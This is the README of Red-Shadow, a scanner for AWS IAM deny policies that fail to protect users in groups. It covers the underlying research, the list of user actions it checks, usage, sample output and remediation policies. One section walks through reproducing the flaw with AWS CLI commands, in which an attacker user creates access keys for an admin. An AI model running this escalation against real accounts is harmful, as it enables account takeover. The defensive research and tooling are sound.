[![red-shadow](static/red-shadow.png)](#)



# Red-Shadow
## Lightspin AWS IAM Vulnerability Scanner


### Description
Scan your AWS IAM Configuration for shadow admins in AWS IAM based on misconfigured deny policies not affecting users in groups discovered by Lightspin's Security Research Team.

The tool detects the misconfigurations in the following IAM Objects:

+ **Managed Policies**

+ **Users Inline Policies**

+ **Groups Inline Policies**

+ **Roles Inline Policies**


### Research Summary
AWS IAM evaluation logic for deny policies applied to groups does not work the same way as most security engineers may be used to with other authorization mechanisms.

Suppose a policy with a group resource has an explicit deny. In that case, this will only impact group actions and not user actions, opening organizations up to misconfiguration and vulnerabilities if they assume the process to be the same as with Active Directory, for example.

Example for vulnerable json policy:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "ProtectManagersByDeny",
            "Effect": "Deny",
            "Action": "*",
            "Resource": "arn:aws:iam::123456789999:group/managers"
        }
    ]
}
```
In this example, the policy should deny any iam action done by users, groups, or roles with that policy attached to, towards the group called managers.

The fact is that simple IAM action like ```iam:ChangePassword``` would work as the deny policy is ineffective.

[Link to the full security research blog](https://blog.lightspin.io/aws-iam-groups-authorization-bypass)

### Detection

AWS IAM has a clear seperation between user object actions and group object actions.

The following list includes the user object actions the tool is scanning over deny policies affecting groups (besides wildcard):
```json
AWS_USER_ACTIONS = ["iam:CreateUser",
                     "iam:GetUser",
                     "iam:UpdateUser",
                     "iam:DeleteUser",
                     "iam:GetUserPolicy",
                     "iam:PutUserPolicy",
                     "iam:DeleteUserPolicy",
                     "iam:ListUserPolicies",
                     "iam:AttachUserPolicy",
                     "iam:DetachUserPolicy",
                     "iam:ListAttachedUserPolicies",
                     "iam:SimulatePrincipalPolicy",
                     "iam:GetContextKeysForPrincipalPolicy",
                     "iam:TagUser",
                     "iam:UpdateSSHPublicKey",
                     "iam:UntagUser",
                     "iam:GetSSHPublicKey",
                     "iam:ListUserTags",
                     "iam:DeleteSSHPublicKey",
                     "iam:GetLoginProfile",
                     "iam:GetAccessKeyLastUsed",
                     "iam:UpdateLoginProfile",
                     "iam:UploadSigningCertificate",
                     "iam:DeleteLoginProfile",
                     "iam:ListSigningCertificates",
                     "iam:CreateLoginProfile",
                     "iam:UpdateSigningCertificate",
                     "iam:EnableMFADevice",
                     "iam:DeleteSigningCertificate",
                     "iam:ResyncMFADevice",
                     "iam:ListServiceSpecificCredentials",
                     "iam:ListMFADevices",
                     "iam:ResetServiceSpecificCredential",
                     "iam:DeactivateMFADevice",
                     "iam:CreateServiceSpecificCredential",
                     "iam:ChangePassword",
                     "iam:UpdateServiceSpecificCredential",
                     "iam:CreateAccessKey",
                     "iam:DeleteServiceSpecificCredential",
                     "iam:ListAccessKeys",
                     "iam:PutUserPermissionsBoundary",
                     "iam:UpdateAccessKey",
                     "iam:DeleteUserPermissionsBoundary",
                     "iam:DeleteAccessKey",
                     "iam:ListGroupsForUser",
                     "iam:ListSSHPublicKeys",
                     "iam:UploadSSHPublicKey"]
```

Many of the user object actions mentioned above can easily lead to a privilege escalation or compromising the account, such as resetting the admin's password, deactivating the root account MFA, and more.

### Requirements
Red-Shadow is built with Python 3 and Boto3.

The tool requires:
- [IAM User with Access Key in OS Env](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
- [Sufficient permissions for the IAM User to run the scanner](red-shadow-policy.json)
- Python 3 and pip3 installed

### Installation
```bash
sudo git clone https://github.com/lightspin-tech/red-shadow.git
cd red-shadow
pip3 install -r requirements.txt
```
### Usage
```bash
python3 red-shadow.py
```

### Analyze Results

The results discover any IAM object that is vulnerable to such authorization bypass in AWS.

Example of results output:
```console
++ Starting Red-Shadow ++

++ AWS IAM Vulnerability Scanner
++ Red Shadow scans for shadow admins in AWS IAM based on misconfigured deny policies not affecting users in groups

Step 1: Searching for IAM Group misconfigurations in managed policies
Found potential misconfiguration at arn:aws:iam::123456789999:policy/ProtectManagers
Progress: |██████████████████████████████████████████████████| 100.0% Complete
Step 2: Searching for IAM Group misconfigurations in Users inline policies
Progress: |██████████████████████████████████████████████████| 100.0% Complete
Step 3: Searching for IAM Group misconfigurations in Groups inline policies
Progress: |██████████████████████████████████████████████████| 100.0% Complete
Step 4: Searching for IAM Group misconfigurations in Roles inline policies
Progress: |██████████████████████████████████████████████████| 100.0% Complete
Done
```

In this console output, we can see that our ProtectManagers deny policy is ineffective and vulnerable to attacks such as privilege escalation mentioned above.
#
### Simulation & Exploitation

To validate the IAM Vulnerability and run the exploitation you can run the following flow:

1. ```aws iam create-group --group-name managers```
2. ```aws iam attach-group-policy --group-name managers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess```
3. ```aws iam create-user --user-name JohnAdmin```
4. ```aws iam add-user-to-group --user-name JohnAdmin --group-name managers```
5. create a policy.json file with the contents below (replace the account id):
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ProtectManagersByDeny",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "arn:aws:iam::123456789999:group/managers"
    }
  ]
}
```
6. ```aws iam create-policy --policy-name ProtectManagers --policy-document file://policy.json```
7. ```aws iam create-group --group-name backend-dev```
8. ```aws iam create-user --user-name BobAttacker```
9. ```aws iam add-user-to-group --user-name BobAttacker --group-name backend-dev```
10. ```aws iam attach-group-policy --group-name backend-dev --policy-arn arn:aws:iam::123456789999:policy/ProtectManagers```
11. Create a policy to allow the users to create access keys in policy_iam.json file for the backend-dev group:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": "iam:CreateAccessKey",
            "Resource": "*"
        }
    ]
}
```
12. ```aws iam create-policy --policy-name devCreateAccessKeys --policy-document file://policy_iam.json```
13. ```aws iam attach-group-policy --group-name backend-dev --policy-arn arn:aws:iam::123456789999:policy/devCreateAccessKeys```
14. Validate our configuration using:
```aws iam list-attached-group-policies --group backend-dev```
15. ```aws iam create-access-key --user-name BobAttacker```
16. Configure the new access key and secret in aws profile (locan env)
17. Now the user BobAttacker can create access key for all resources but has an explicit deny for the managers group.

**Lets Exploit the vulnerability using:**

```aws iam create-access-key --user-name JohnAdmin --profile BobAttacker```

**Privilege Escalation Complete!**

#
### Remediation

Once you have found the policies vulnerable to the authorization bypass, there are two possible ways to remediate the vulnerability and fix the policy:

**OPTION 1:** Define all relevant users in the resource field instead of groups to avoid ineffective iam actions, and deny all group actions, such as the following example:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenySpecificUserActions",
            "Effect": "Deny",
            "Action": [
                "iam:CreateLoginProfile",
                "iam:ChangePassword",
                "iam:CreateAccessKey"
            ],
            "Resource": [
                "arn:aws:iam::123456789999:user/DanaH@acme.com",
                "arn:aws:iam::123456789999:user/DavidZ@acme.com",
                "arn:aws:iam::123456789999:user/EladS@acme.com"
            ]
        },
        {
            "Sid": "DenyAllGroupActions",
            "Effect": "Deny",
            "Action": "*",
            "Resource": "arn:aws:iam::123456789999:group/managers"
        }
    ]
}
```

**OPTION 2:** Use condition in the policy with iam:ResourceTag in place such as the following example:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Deny",
            "Action": [
                "iam:CreateLoginProfile",
                "iam:ChangePassword",
                "iam:CreateAccessKey"
            ],
            "Resource": "*",
            "Condition": {
                "ForAnyValue:StringEquals": {
                    "iam:ResourceTag/group": "managers"
                }
            }
        }
    ]
}
```

### Contact Us
This research was held by Lightspin's Security Research Team.
For more information, contact us at support@lightspin.io.


### License
This repository is available under the [Apache License 2.0](https://github.com/lightspin-tech/red-shadow/blob/main/LICENSE).
